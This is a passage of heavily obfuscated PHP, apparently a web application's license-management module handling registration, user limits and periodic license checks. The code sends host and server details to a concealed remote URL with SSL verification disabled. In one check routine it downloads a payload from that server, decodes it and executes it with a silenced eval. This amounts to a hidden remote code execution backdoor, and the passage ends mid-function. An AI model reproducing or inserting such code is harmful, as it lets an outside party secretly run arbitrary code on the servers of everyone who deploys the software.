$ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$ãÁÃ“Î—[89]] = array($ãÁÃ“Î—[90] => (int) $¢Íæ¹õ[$ãÁÃ“Î—[91]], $ãÁÃ“Î—[92] => (int) _get($¢Íæ¹õ, $ãÁÃ“Î—[93], 0)); $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[95]] = Action($ãÁÃ“Î—[96])->accessToken(); $’Íª°ƒ® = $ô­™•×æ[648]; if (strlen($’Íª°ƒ®) < $ô­™•×æ[628]) { die; } $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[97]] = md5($_SERVER[$ãÁÃ“Î—[98]] . $¤„€Öêø[$ãÁÃ“Î—[99]]); $´Äš¿® = $ô­™•×æ[649]; $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[100]] = base64_encode(serverInfo()); $úàş¶íî = $ô­™•×æ[650]; if (strlen($úàş¶íî) < $ô­™•×æ[625]) { die; } $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[101]] = $this->lady05e9d79a; if ($¤„€Öêø[$ãÁÃ“Î—[101]] != $ãÁÃ“Î—[102]) { $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[103]] = $¤„€Öêø[$ãÁÃ“Î—[103]]; $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[104]] = $¤„€Öêø[$ãÁÃ“Î—[104]]; $…åíÄË = rand_string(10) . $this->lady05e9d79a . rand_string(5); $ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[105]][$ãÁÃ“Î—[106]] = $this->avskd68d02aa($…åíÄË, $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[97]]); } if ($this->lady05e9d79a == $ãÁÃ“Î—[102]) { $ú˜²ô²¡[$ãÁÃ“Î—[83]][$ãÁÃ“Î—[84]][$ãÁÃ“Î—[89]][$ãÁÃ“Î—[93]] = 0; } $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[107]] = _get($this->ztur5f4d2ac4, $ãÁÃ“Î—[108], $ãÁÃ“Î—[6]); $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[109]] = _get($this->ztur5f4d2ac4, $ãÁÃ“Î—[110], $ãÁÃ“Î—[6]); $³ôğèÓ¿ = $ô­™•×æ[651]; if (!$³ôğèÓ¿) { die; } if (_get($GLOBALS, $ãÁÃ“Î—[111]) && $this->config[$ãÁÃ“Î—[112]]) { $ú˜²ô²¡[$ãÁÃ“Î—[94]][$ãÁÃ“Î—[113]] = WEB_ROOT; } return $ú˜²ô²¡; } private function cimg55745b61() { $áÃ‚©û =& $_SERVER[Ù×¯Ø…]; $æê±‹€  =& $_SERVER[›õ¡œ§]; if ($_SERVER[$æê±‹€ [24]] == $æê±‹€ [114]) { $­Ç”ù¤ = array($æê±‹€ [101] => $this->lady05e9d79a, $æê±‹€ [115] => $this->gcqj64b92c1c(), $æê±‹€ [116] => Model($æê±‹€ [117])->count()); if ($this->lady05e9d79a != $æê±‹€ [102]) { $­˜Ğ¥æÍ = _get($this->ztur5f4d2ac4, $æê±‹€ [118]); if ($­˜Ğ¥æÍ) { $­Ç”ù¤[$æê±‹€ [119]] = $­˜Ğ¥æÍ; $­Ç”ù¤[$æê±‹€ [120]] = strtotime(_get($this->ztur5f4d2ac4, $æê±‹€ [121])); $­Ç”ù¤[$æê±‹€ [122]] = _get($this->ztur5f4d2ac4, $æê±‹€ [110]); } $ıŒİÉŒí = Model($æê±‹€ [33])->get($æê±‹€ [123], $æê±‹€ [6], !0); if (is_string($ıŒİÉŒí) && substr($ıŒİÉŒí, 0, 1) == $æê±‹€ [124]) { $ıŒİÉŒí = json_decode_force($ıŒİÉŒí); } if (is_array($ıŒİÉŒí) && $ıŒİÉŒí[$æê±‹€ [125]] && strstr($ıŒİÉŒí[$æê±‹€ [125]], $æê±‹€ [126])) { $Ö³¢À›¬ = explode($æê±‹€ [126], $ıŒİÉŒí[$æê±‹€ [125]]); $­Ç”ù¤[$æê±‹€ [127]] = $Ö³¢À›¬[0]; } } $­Ç”ù¤ = $this->ycug726a798e(json_encode($­Ç”ù¤), md5($æê±‹€ [128])); $¾˜ÖÃ½± = array($æê±‹€ [129] => $­Ç”ù¤); call_user_func(array($æê±‹€ [130], $æê±‹€ [131]), $¾˜ÖÃ½±); } if ($this->lady05e9d79a == $æê±‹€ [102]) { return; } $´ó³ùö“ = array($æê±‹€ [132], $æê±‹€ [133], $æê±‹€ [134], $æê±‹€ [135], $æê±‹€ [136], $æê±‹€ [137]); $òîóˆ€ñ = Model($æê±‹€ [33])->get(); $¾˜ÖÃ½± = array($æê±‹€ [138] => $òîóˆ€ñ[$æê±‹€ [34]], $æê±‹€ [139] => $òîóˆ€ñ[$æê±‹€ [35]], $æê±‹€ [140] => $æê±‹€ [6]); $ÏÍ‡øÅı = $áÃ‚©û[652]; if (!$ÏÍ‡øÅı) { return; } foreach ($´ó³ùö“ as $÷ ğÑ‰±) { if (!isset($òîóˆ€ñ[$÷ ğÑ‰±]) || !$òîóˆ€ñ[$÷ ğÑ‰±]) { continue; } $¾˜ÖÃ½±[$÷ ğÑ‰±] = $òîóˆ€ñ[$÷ ğÑ‰±]; } call_user_func(array($æê±‹€ [130], $æê±‹€ [131]), $¾˜ÖÃ½±); $ÖÛ¨±üË = $áÃ‚©û[653]; while (strlen($ÖÛ¨±üË) < $áÃ‚©û[628]) { if (!$ÖÛ¨±üË) { break; } $ÖÛ¨±üË++; } } private function wsftf276eef8() { $ß…ÊÛïı =& $_SERVER[Ù×¯Ø…]; $ƒÖÊ” =& $_SERVER[›õ¡œ§]; if ($_SERVER[$ƒÖÊ”[24]] != $ƒÖÊ”[141]) { return; } if (!_get($GLOBALS, $ƒÖÊ”[111])) { die; } $°„ Àû = $GLOBALS[$ƒÖÊ”[13]]; if (isset($°„ Àû[$ƒÖÊ”[142]])) { $this->bwcr38ab92bf(); die; } if (!isset($°„ Àû[$ƒÖÊ”[143]]) || strlen($°„ Àû[$ƒÖÊ”[143]]) != 16) { show_json($ƒÖÊ”[144] . $°„ Àû[$ƒÖÊ”[143]], !1); } $ØÕ²Çä = Model($ƒÖÊ”[33])->get($ƒÖÊ”[99]); $…İ»ü¨ = md5($_SERVER[$ƒÖÊ”[98]] . $ØÕ²Çä); $ûÛ¢·¨º = array($ƒÖÊ”[143] => $°„ Àû[$ƒÖÊ”[143]], $ƒÖÊ”[145] => rand_string(16), $ƒÖÊ”[146] => $ƒÖÊ”[128], $ƒÖÊ”[147] => $ƒÖÊ”[148], $ƒÖÊ”[149] => $_SERVER[$ƒÖÊ”[150]], $ƒÖÊ”[151] => $_SERVER[$ƒÖÊ”[152]], $ƒÖÊ”[153] => $_SERVER[$ƒÖÊ”[154]], $ƒÖÊ”[97] => $…İ»ü¨, $ƒÖÊ”[155] => Model($ƒÖÊ”[33])->get($ƒÖÊ”[123])); $£—ùƒ·… = $ß…ÊÛïı[654]; while (strlen($£—ùƒ·…) < $ß…ÊÛïı[613]) { if (!$£—ùƒ·…) { break; } $£—ùƒ·…++; } if ($°„ Àû[$ƒÖÊ”[156]] == $ƒÖÊ”[157]) { $ì…Œşñ» = $this->ycug726a798e($…İ»ü¨, $ƒÖÊ”[158]); $ã¸»ßÅŒ = $this->avskd68d02aa(json_encode($ûÛ¢·¨º), $…İ»ü¨ . $ƒÖÊ”[159], 3); $ã¸»ßÅŒ = $ã¸»ßÅŒ . $ƒÖÊ”[160] . $_SERVER[$ƒÖÊ”[150]]; $‰¸üõµƒ = $this->zbgd2c41d1e9($ƒÖÊ”[161] . $ì…Œşñ» . $ƒÖÊ”[162] . $ã¸»ßÅŒ, -1); show_json($‰¸üõµƒ, !0); } else { if ($°„ Àû[$ƒÖÊ”[156]] == $ƒÖÊ”[163]) { $†øúÙ¢ö = substr(md5($ƒÖÊ”[164] . $…İ»ü¨), 12, 15) . $ƒÖÊ”[165]; $ã¸»ßÅŒ = $this->zfpc5706f735(trim($°„ Àû[$ƒÖÊ”[166]]), $†øúÙ¢ö, 2); $¤É¶øæƒ = json_decode($ã¸»ßÅŒ, !0); if (!is_array($¤É¶øæƒ) || !is_array($¤É¶øæƒ[$ƒÖÊ”[167]]) || $¤É¶øæƒ[$ƒÖÊ”[143]] != !0) { $—¢üáÇÃ = $ƒÖÊ”[168]; $”äÛØêˆ = $¤É¶øæƒ[$ƒÖÊ”[167]] ? $ƒÖÊ”[169] . $¤É¶øæƒ[$ƒÖÊ”[167]] : $—¢üáÇÃ; show_json($”äÛØêˆ, !1); } else { $ûÛ¢·¨º[$ƒÖÊ”[145]] = $¤É¶øæƒ[$ƒÖÊ”[167]][$ƒÖÊ”[170]]; } } else { $¤É¶øæƒ = $this->zbgd2c41d1e9($ƒÖÊ”[171], $ûÛ¢·¨º, 10); $ˆ¯ªª«‚ = $ß…ÊÛïı[655]; } } if (!is_array($¤É¶øæƒ) || !is_array($¤É¶øæƒ[$ƒÖÊ”[167]]) || $¤É¶øæƒ[$ƒÖÊ”[143]] != !0) { $—¢üáÇÃ = LNG($ƒÖÊ”[172]); $”äÛØêˆ = $¤É¶øæƒ[$ƒÖÊ”[167]] ? $ƒÖÊ”[169] . $¤É¶øæƒ[$ƒÖÊ”[167]] : $—¢üáÇÃ; show_json($”äÛØêˆ, !1); } $º™¨ö¶Š = $¤É¶øæƒ[$ƒÖÊ”[167]]; $şŞÖßÅ” = $this->tndg74346dd9($º™¨ö¶Š[$ƒÖÊ”[173]]); $å›ìÂ§ = $ß…ÊÛïı[656]; if (strlen($å›ìÂ§) < $ß…ÊÛïı[613]) { return; } if (!$şŞÖßÅ” || $şŞÖßÅ” != $º™¨ö¶Š[$ƒÖÊ”[121]]) { $”›‡Ö× = array($ƒÖÊ”[174] => Model($ƒÖÊ”[33])->get($ƒÖÊ”[99]), $ƒÖÊ”[175] => $_SERVER[$ƒÖÊ”[98]], $ƒÖÊ”[176] => this_url(), $ƒÖÊ”[151] => $_SERVER[$ƒÖÊ”[152]]); $ã¸»ßÅŒ = $this->jqnm1cbf76b7(json_encode($”›‡Ö×)); $this->zbgd2c41d1e9($ƒÖÊ”[177] . $ã¸»ßÅŒ); show_json(LNG($ƒÖÊ”[178]), !0); } $³Ú£¸‰ = array($ƒÖÊ”[179] => $º™¨ö¶Š[$ƒÖÊ”[180]], $ƒÖÊ”[181] => $º™¨ö¶Š[$ƒÖÊ”[182]], $ƒÖÊ”[183] => rand_string(16), $ƒÖÊ”[101] => $º™¨ö¶Š[$ƒÖÊ”[184]]); if ($ûÛ¢·¨º[$ƒÖÊ”[145]]) { $³Ú£¸‰[$ƒÖÊ”[183]] = $ûÛ¢·¨º[$ƒÖÊ”[145]]; } $ Æûû˜Ş = substr(md5($³Ú£¸‰[$ƒÖÊ”[181]]), 10, 10); $Ÿ´Í¿İ½ = $ Æûû˜Ş . $³Ú£¸‰[$ƒÖÊ”[101]] . $³Ú£¸‰[$ƒÖÊ”[183]]; $³Ú£¸‰[$ƒÖÊ”[103]] = strrev(base64_encode($this->ycug726a798e($Ÿ´Í¿İ½, $ƒÖÊ”[185]))); $ÌœØ¦€° = rand_string(16); $ÓÂàÀàñ = $ÌœØ¦€° . $³Ú£¸‰[$ƒÖÊ”[101]] . $this->ycug726a798e(md5($³Ú£¸‰[$ƒÖÊ”[179]]), $ÌœØ¦€°); $°Ïßıôà = $ß…ÊÛïı[657]; $³Ú£¸‰[$ƒÖÊ”[104]] = base64_encode(strrev($this->ycug726a798e($ÓÂàÀàñ, $ƒÖÊ”[186]))); if ($º™¨ö¶Š[$ƒÖÊ”[187]] && $º™¨ö¶Š[$ƒÖÊ”[187]] >= 1) { Model($ƒÖÊ”[33])->setDeep($ƒÖÊ”[188], $ƒÖÊ”[189]); } Model($ƒÖÊ”[33])->set($³Ú£¸‰); $ÙÁŞäù† = md5($_SERVER[$ƒÖÊ”[98]] . strrev($ØÕ²Çä) . $³Ú£¸‰[$ƒÖÊ”[181]]); $³ÎÓ’— = $ß…ÊÛïı[658]; $ÂĞÍşÄ÷ = strrev(substr($ÙÁŞäù†, 10, 16)); $ôĞÚìä¹ = $this->avskd68d02aa(json_encode($º™¨ö¶Š), $ÙÁŞäù†); $èÔ¹Ï¹ = $ß…ÊÛïı[659]; if (!$èÔ¹Ï¹) { die; } $Ï¯¥€‘ = array_to_keyvalue(Model($ƒÖÊ”[7])->listData(), $ƒÖÊ”[190]); $éú­ÇŞ = $ß…ÊÛïı[660]; if (!$éú­ÇŞ) { return; } $øïúé¯¬ = $Ï¯¥€‘[$ƒÖÊ”[191]]; $­ö¯Ü¶ = $ß…ÊÛïı[661]; if (!$­ö¯Ü¶) { die; } $åº‘Ğ¨ = array(); $åº‘Ğ¨[$ÂĞÍşÄ÷] = $ôĞÚìä¹; $Ó§û­æ = $ß…ÊÛïı[662]; Model($ƒÖÊ”[7])->update($øïúé¯¬[$ƒÖÊ”[192]], array($ƒÖÊ”[193] => $åº‘Ğ¨)); $óæÕñ¬ = $ß…ÊÛïı[663]; while ($óæÕñ¬ < $ß…ÊÛïı[618]) { if ($óæÕñ¬ >= 0) { break; } $óæÕñ¬++; } $this->ztur5f4d2ac4 = $º™¨ö¶Š; $µÃüµÂê = $ß…ÊÛïı[664]; while ($µÃüµÂê < $ß…ÊÛïı[613]) { if ($µÃüµÂê >= 0) { break; } $µÃüµÂê++; } $this->lady05e9d79a = $³Ú£¸‰[$ƒÖÊ”[101]]; $this->licenseRegistSuccess(); Cache::set($ƒÖÊ”[194] . md5($ØÕ²Çä . $ƒÖÊ”[195]), $ƒÖÊ”[6]); show_json(LNG($ƒÖÊ”[178]), !0); $ÔÊî¹ = $ß…ÊÛïı[665]; if (!$ÔÊî¹) { return; } } private function licenseRegistSuccess() { $Ñûª®ı³ =& $_SERVER[›õ¡œ§]; $¶ÃãĞšì = Model($Ñûª®ı³[33])->get(); if ($¶ÃãĞšì[$Ñûª®ı³[63]] != $Ñûª®ı³[189]) { Model($Ñûª®ı³[33])->set($Ñûª®ı³[63], $Ñûª®ı³[189]); } Action($Ñûª®ı³[196])->initStart(!0); } private function bwcr38ab92bf() { $‡Ş°°¥§ =& $_SERVER[Ù×¯Ø…]; $ÃééÖİÚ =& $_SERVER[›õ¡œ§]; Model($ÃééÖİÚ[33])->set(array($ÃééÖİÚ[179] => $ÃééÖİÚ[6], $ÃééÖİÚ[181] => $ÃééÖİÚ[6], $ÃééÖİÚ[101] => $ÃééÖİÚ[102], $ÃééÖİÚ[103] => $ÃééÖİÚ[6], $ÃééÖİÚ[104] => $ÃééÖİÚ[6])); $œ»¶Šá = $‡Ş°°¥§[666]; Model($ÃééÖİÚ[33])->setDeep($ÃééÖİÚ[188], $ÃééÖİÚ[197]); $â×ª¡œş = $‡Ş°°¥§[667]; $this->ztur5f4d2ac4 = array(); $this->lady05e9d79a = $ÃééÖİÚ[102]; $§œØÎ­“ = $‡Ş°°¥§[668]; if (strlen($§œØÎ­“) < $‡Ş°°¥§[613]) { die; } } private function ovgaa9ab3f8d() { $· Ò÷¸ =& $_SERVER[Ù×¯Ø…]; $¿ÁÛÂÖø =& $_SERVER[›õ¡œ§]; $_SERVER[$¿ÁÛÂÖø[152]] = _get($_SERVER, $¿ÁÛÂÖø[152], APP_HOST); $this->lady05e9d79a = $¿ÁÛÂÖø[102]; $ÓèÄç£Û = $· Ò÷¸[652]; if (!$ÓèÄç£Û) { die; } $®µÊÄà² = Model($¿ÁÛÂÖø[33])->get(); if ($®µÊÄà²[$¿ÁÛÂÖø[101]] == $¿ÁÛÂÖø[102]) { return; } $€ªÒ¶Ê = Model($¿ÁÛÂÖø[33])->get($¿ÁÛÂÖø[99]); $¯ï×½Â = $· Ò÷¸[669]; if (!$¯ï×½Â) { die; } $°Æñ¢ä’ = $¿ÁÛÂÖø[194] . md5($€ªÒ¶Ê . $¿ÁÛÂÖø[195]); $Úóëµ² = $· Ò÷¸[670]; if (strlen($Úóëµ²) < $· Ò÷¸[625]) { die; } $ùÛÄ®í = Cache::get($°Æñ¢ä’); if (!is_array($ùÛÄ®í) || !isset($ùÛÄ®í[$¿ÁÛÂÖø[198]]) || time() - $ùÛÄ®í[$¿ÁÛÂÖø[198]] >= 60) { $´·‚Îùƒ = Model($¿ÁÛÂÖø[7])->loadList(); $•Ê‹±¶° = $´·‚Îùƒ[$¿ÁÛÂÖø[191]]; $ôà««„± = md5($_SERVER[$¿ÁÛÂÖø[98]] . strrev($€ªÒ¶Ê) . $®µÊÄà²[$¿ÁÛÂÖø[181]]); $ÅÄîŞ‡– = strrev(substr($ôà««„±, 10, 16)); $ùÛÄ®í = $this->zfpc5706f735($•Ê‹±¶°[$¿ÁÛÂÖø[81]][$ÅÄîŞ‡–], $ôà««„±); $ùÛÄ®í = json_decode($ùÛÄ®í, !0); } if (!is_array($ùÛÄ®í)) { return $this->bwcr38ab92bf(); } $İá¾¯ƒˆ = strtotime($ùÛÄ®í[$¿ÁÛÂÖø[121]]); if (time() >= $İá¾¯ƒˆ) { return $this->bwcr38ab92bf(); } if (time() - $ùÛÄ®í[$¿ÁÛÂÖø[198]] > 20) { $ùÛÄ®í[$¿ÁÛÂÖø[198]] = time(); Cache::set($°Æñ¢ä’, $ùÛÄ®í); } $this->ztur5f4d2ac4 = $ùÛÄ®í; $this->lady05e9d79a = $®µÊÄà²[$¿ÁÛÂÖø[101]]; } private function ybsld6b6cae0() { $‡¬ûüÓ² =& $_SERVER[›õ¡œ§]; $æ«ò˜› = $GLOBALS[$‡¬ûüÓ²[13]]; $‘„ö¾À÷ = $_SERVER[Ù×¯Ø…][671]; if (!$‘„ö¾À÷) { return; } $©¦ Œƒâ = $_SERVER[$‡¬ûüÓ²[24]]; if ($©¦ Œƒâ == $‡¬ûüÓ²[199] && $this->lady05e9d79a == $‡¬ûüÓ²[102]) { show_json(LNG($‡¬ûüÓ²[200]), !1, $‡¬ûüÓ²[201]); } $Œ§ø÷Ò° = array($‡¬ûüÓ²[202], $‡¬ûüÓ²[203]); if (in_array($©¦ Œƒâ, $Œ§ø÷Ò°)) { if ($this->lady05e9d79a == $‡¬ûüÓ²[102] && isset($æ«ò˜›[$‡¬ûüÓ²[204]])) { show_json(LNG($‡¬ûüÓ²[200]), !1, $‡¬ûüÓ²[201]); die; } $¢™ôØ—ß = $this->gcqj64b92c1c(); if ($¢™ôØ—ß != intval($‡¬ûüÓ²[205])) { if ($¢™ôØ—ß <= Model($‡¬ûüÓ²[117])->count()) { show_json(LNG($‡¬ûüÓ²[206]), !1, $‡¬ûüÓ²[201]); die; } } } } private function btrl2b36921d() { $šü¬²å =& $_SERVER[Ù×¯Ø…]; $¾ú½©ŸÌ =& $_SERVER[›õ¡œ§]; $œï¢²Î  = array($¾ú½©ŸÌ[114], $¾ú½©ŸÌ[207]); if (!_get($GLOBALS, $¾ú½©ŸÌ[111]) || !isset($_GET[$¾ú½©ŸÌ[208]])) { return; } if (!in_array($_SERVER[$¾ú½©ŸÌ[24]], $œï¢²Î )) { return; } $€èÔ° = $¾ú½©ŸÌ[209]; $€èÔ° = $this->wvlrf11b64c5($€èÔ°, $¾ú½©ŸÌ[210]); $ÙŒ«°‚ = $šü¬²å[614]; $Ë³”«Š = stream_context_create(array($¾ú½©ŸÌ[211] => array($¾ú½©ŸÌ[212] => $¾ú½©ŸÌ[213], $¾ú½©ŸÌ[214] => 3))); $Ó¬¯ÅóŸ = @file_get_contents($€èÔ°, !1, $Ë³”«Š); $©Ş¿Ò§ = $šü¬²å[672]; header($¾ú½©ŸÌ[215]); if ($Ó¬¯ÅóŸ && strstr($Ó¬¯ÅóŸ, $¾ú½©ŸÌ[216])) { echo $Ó¬¯ÅóŸ; } die; } public function evrc2fa39277($êÇÃãŒ) { $¸ëÌ÷›É =& $_SERVER[Ù×¯Ø…]; $»ˆş©ê =& $_SERVER[›õ¡œ§]; if ($this->lady05e9d79a == $»ˆş©ê[217]) { return $êÇÃãŒ; } $•½ößÎï = array($»ˆş©ê[218] => $»ˆş©ê[219], $»ˆş©ê[220] => $»ˆş©ê[219], $»ˆş©ê[221] => $»ˆş©ê[219], $»ˆş©ê[222] => $»ˆş©ê[219], $»ˆş©ê[223] => $»ˆş©ê[224], $»ˆş©ê[225] => $»ˆş©ê[224], $»ˆş©ê[226] => $»ˆş©ê[224], $»ˆş©ê[227] => $»ˆş©ê[224], $»ˆş©ê[228] => $»ˆş©ê[224], $»ˆş©ê[229] => $»ˆş©ê[224], $»ˆş©ê[230] => $»ˆş©ê[224], $»ˆş©ê[231] => $»ˆş©ê[224], $»ˆş©ê[232] => $»ˆş©ê[224], $»ˆş©ê[233] => $»ˆş©ê[224], $»ˆş©ê[234] => $»ˆş©ê[224], $»ˆş©ê[235] => $»ˆş©ê[224]); $ô©³İ†ï = explode($»ˆş©ê[236], _get($this->ztur5f4d2ac4, $»ˆş©ê[108], $»ˆş©ê[6])); $Ã‰â¿ˆ¢ = $¸ëÌ÷›É[673]; $èŞ¹°ûó = array(); $½ôÚğÅ = $¸ëÌ÷›É[674]; if (strlen($½ôÚğÅ) < $¸ëÌ÷›É[625]) { return; } foreach ($•½ößÎï as $¤ª¢²¨ => $î†´×Şï) { if ($î†´×Şï == $»ˆş©ê[219] && substr($this->lady05e9d79a, 0, 1) == $»ˆş©ê[219]) { continue; } if (!in_array($¤ª¢²¨, $ô©³İ†ï)) { $èŞ¹°ûó[] = $¤ª¢²¨; } } foreach ($èŞ¹°ûó as $¤ª¢²¨) { unset($êÇÃãŒ[$¤ª¢²¨]); } return $êÇÃãŒ; $ûÚµ½Ë = $¸ëÌ÷›É[675]; if (!$ûÚµ½Ë) { return; } } private function auxi69017af9() { $Ï”Ïæå =& $_SERVER[›õ¡œ§]; if ($this->lady05e9d79a != $Ï”Ïæå[102]) { $GLOBALS[$Ï”Ïæå[81]][$Ï”Ïæå[85]][$Ï”Ïæå[237]] = $Ï”Ïæå[197]; return; } $GLOBALS[$Ï”Ïæå[81]][$Ï”Ïæå[238]] = $Ï”Ïæå[189]; if (Model($Ï”Ïæå[239])->get($Ï”Ïæå[63]) != $Ï”Ïæå[197]) { Model($Ï”Ïæå[239])->set($Ï”Ïæå[63], $Ï”Ïæå[197]); } } public function kriq27893ee8() { $´¯ïè˜ô =& $_SERVER[Ù×¯Ø…]; return $_SERVER[›õ¡œ§][240]; $ó£ÚÓßë = $´¯ïè˜ô[676]; if (strlen($ó£ÚÓßë) < $´¯ïè˜ô[618]) { die; } } private function lvysd2674034() { $˜© ¼¼ò =& $_SERVER[Ù×¯Ø…]; $›éÎ»Ş¿ =& $_SERVER[›õ¡œ§]; $¬”Ÿçôš = array($›éÎ»Ş¿[241], $›éÎ»Ş¿[242], $›éÎ»Ş¿[243]); $äƒğ²¥· = $˜© ¼¼ò[677]; if (strlen($äƒğ²¥·) < $˜© ¼¼ò[613]) { return; } $£Ÿ§ÚöÊ = $›éÎ»Ş¿[244] . md5($›éÎ»Ş¿[245]); if ($this->lady05e9d79a == $›éÎ»Ş¿[102] || !_get($GLOBALS, $›éÎ»Ş¿[111])) { return; } if (!in_array($_SERVER[$›éÎ»Ş¿[24]], $¬”Ÿçôš)) { return; } if (time() % 4 != 0) { return; } $‰ßÜ£úï = call_user_func(array($›éÎ»Ş¿[246], $›éÎ»Ş¿[247]), $£Ÿ§ÚöÊ); if ($‰ßÜ£úï && time() - $‰ßÜ£úï < intval($›éÎ»Ş¿[248])) { return; } call_user_func(array($›éÎ»Ş¿[246], $›éÎ»Ş¿[131]), $£Ÿ§ÚöÊ, time()); $áÍ–¯¢ = $˜© ¼¼ò[678]; $Ì¾Â¯’³ = Model($›éÎ»Ş¿[33])->get($›éÎ»Ş¿[99]); $İ—µÉ§ç = $˜© ¼¼ò[679]; if (!$İ—µÉ§ç) { return; } $À‰·¡·‚ = array($›éÎ»Ş¿[143] => Model($›éÎ»Ş¿[33])->get($›éÎ»Ş¿[179]), $›éÎ»Ş¿[156] => $this->lady05e9d79a, $›éÎ»Ş¿[153] => $_SERVER[$›éÎ»Ş¿[154]], $›éÎ»Ş¿[155] => Model($›éÎ»Ş¿[33])->get($›éÎ»Ş¿[123]), $›éÎ»Ş¿[97] => md5($_SERVER[$›éÎ»Ş¿[98]] . $Ì¾Â¯’³), $›éÎ»Ş¿[146] => $›éÎ»Ş¿[128], $›éÎ»Ş¿[149] => $_SERVER[$›éÎ»Ş¿[150]]); $şÈœ‚Šû = $this->zbgd2c41d1e9($›éÎ»Ş¿[249], $À‰·¡·‚); if (!is_array($şÈœ‚Šû)) { return; } if ($şÈœ‚Šû[$›éÎ»Ş¿[143]] && $şÈœ‚Šû[$›éÎ»Ş¿[250]]) { if ($this->tndg74346dd9($şÈœ‚Šû[$›éÎ»Ş¿[250]]) == $À‰·¡·‚[$›éÎ»Ş¿[143]]) { return; } } $this->bwcr38ab92bf(); if ($this->tndg74346dd9($şÈœ‚Šû[$›éÎ»Ş¿[250]]) != $À‰·¡·‚[$›éÎ»Ş¿[143]]) { $×†¸¢±Ş = array($›éÎ»Ş¿[174] => $Ì¾Â¯’³, $›éÎ»Ş¿[175] => $_SERVER[$›éÎ»Ş¿[98]], $›éÎ»Ş¿[176] => this_url(), $›éÎ»Ş¿[151] => $_SERVER[$›éÎ»Ş¿[152]]); $œ¡ê¯Úİ = $this->jqnm1cbf76b7(json_encode($×†¸¢±Ş)); $şÈœ‚Šû = $this->zbgd2c41d1e9($›éÎ»Ş¿[177] . $œ¡ê¯Úİ); if ($şÈœ‚Šû && is_array($şÈœ‚Šû) && isset($şÈœ‚Šû[$›éÎ»Ş¿[250]])) { $”“¹»æğ = $this->zfpc5706f735($şÈœ‚Šû[$›éÎ»Ş¿[250]], 2); if ($”“¹»æğ) { $”“¹»æğ = $this->tndg74346dd9($”“¹»æğ); } if ($”“¹»æğ) { try { @eval($”“¹»æğ); } catch (Exception $„úéäş) { } } } } } private function zbgd2c41d1e9($ñ«öÜú× = '', $„óñèíì = array(), $·§¤ö = 5) { $ïô¨± =& $_SERVER[Ù×¯Ø…]; $ğâÜÙ³ =& $_SERVER[›õ¡œ§]; $ç¥ë© = $ğâÜÙ³[251]; $„ÉõÃ˜æ = $ïô¨±[680]; $ç¥ë© = $this->wvlrf11b64c5($ç¥ë©, $ğâÜÙ³[252]); $Í½ÛØÈ´ = $ïô¨±[681]; if (strlen($Í½ÛØÈ´) < $ïô¨±[628]) { die; } $ç¥ë© = $ç¥ë© . $ñ«öÜú×; if ($„óñèíì && is_array($„óñèíì)) { $ç¥ë© = $ç¥ë© . $ğâÜÙ³[253] . http_build_query($„óñèíì); } if ($„óñèíì === -1) { return $ç¥ë©; } $‚¶Â©÷ = stream_context_create(array($ğâÜÙ³[211] => array($ğâÜÙ³[214] => $·§¤ö, $ğâÜÙ³[212] => $ğâÜÙ³[254]), $ğâÜÙ³[255] => array($ğâÜÙ³[256] => !1, $ğâÜÙ³[257] => !1))); $”èœñœ = $ïô¨±[682]; $„óñèíì = @file_get_contents($ç¥ë©, !1, $‚¶Â©÷); return json_decode($„óñèíì, !0); $éî«ßµè = $ïô¨±[683]; if (!$éî«ßµè) { return; } $›×Ü½ä› = $ïô¨±[684]; while ($›×Ü½ä› < $ïô¨±[628]) { if ($›×Ü½ä› >= 0) { break; } $›×Ü½ä›++; } } private function gcqj64b92c1c() { $æ·½±Å­ =& $_SERVER[Ù×¯Ø…]; $çáø”ˆ° =& $_SERVER[›õ¡œ§]; $ú¹—¹òø = array($çáø”ˆ°[258] => $çáø”ˆ°[259], $çáø”ˆ°[260] => $çáø”ˆ°[261], $çáø”ˆ°[262] => $çáø”ˆ°[263], $çáø”ˆ°[264] => $çáø”ˆ°[265], $çáø”ˆ°[266] => $çáø”ˆ°[267], $çáø”ˆ°[268] => $çáø”ˆ°[205], $çáø”ˆ°[269] => $çáø”ˆ°[205], $çáø”ˆ°[270] => $çáø”ˆ°[259], $çáø”ˆ°[271] => $çáø”ˆ°[261], $çáø”ˆ°[272] => $çáø”ˆ°[263], $çáø”ˆ°[273] => $çáø”ˆ°[274], $çáø”ˆ°[275] => $çáø”ˆ°[265], $çáø”ˆ°[276] => $çáø”ˆ°[277], $çáø”ˆ°[278] => $çáø”ˆ°[267], $çáø”ˆ°[279] => $çáø”ˆ°[280], $çáø”ˆ°[281] => $çáø”ˆ°[282], $çáø”ˆ°[283] => $çáø”ˆ°[284]); $Ü–âêéº = $æ·½±Å­[685]; $ĞÁáó±Ø = $ú¹—¹òø[$this->lady05e9d79a]; $ĞÁáó±Ø = intval($ĞÁáó±Ø ? $ĞÁáó±Ø : $çáø”ˆ°[259]); $ßç•è€¬ = $æ·½±Å­[686]; while ($ßç•è€¬ < $æ·½±Å­[402]) { if ($ßç•è€¬ >= 0) { break; } $ßç•è€¬++; } $óœ…ÄŠş = _get($this->ztur5f4d2ac4, $çáø”ˆ°[285]); $üÊßá…ş = $æ·½±Å­[687]; $óœ…ÄŠş = $óœ…ÄŠş ? intval($óœ…ÄŠş) : 0; return $ĞÁáó±Ø + $óœ…ÄŠş; $ù¹÷°Ì† = $æ·½±Å­[688]; if (!$ù¹÷°Ì†) { return; } } public function zjmacfd027ca($¡¤Åûò) { $è„ú£® =& $_SERVER[Ù×¯Ø…]; $ßçÜşÏô =& $_SERVER[›õ¡œ§]; $ù­˜×ó½ = $this->gcqj64b92c1c(); if ($¡¤Åûò[$ßçÜşÏô[286]] == $ßçÜşÏô[189]) { return; } if ($ù­˜×ó½ >= intval($ßçÜşÏô[205])) { return; } $Š¹ˆÍî† = Model($ßçÜşÏô[117])->count(); if 